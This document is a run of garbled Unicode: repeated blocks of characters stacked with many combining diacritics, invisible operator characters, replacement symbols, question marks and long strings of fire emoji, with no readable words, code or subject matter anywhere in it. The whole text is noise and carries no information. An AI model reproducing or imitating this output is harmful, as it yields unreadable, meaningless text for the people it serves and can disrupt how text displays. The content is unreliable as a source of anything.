͓̼͍̟̗͕⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͋̓̓͐̾̋̓̔͋̈́̎̾̕͝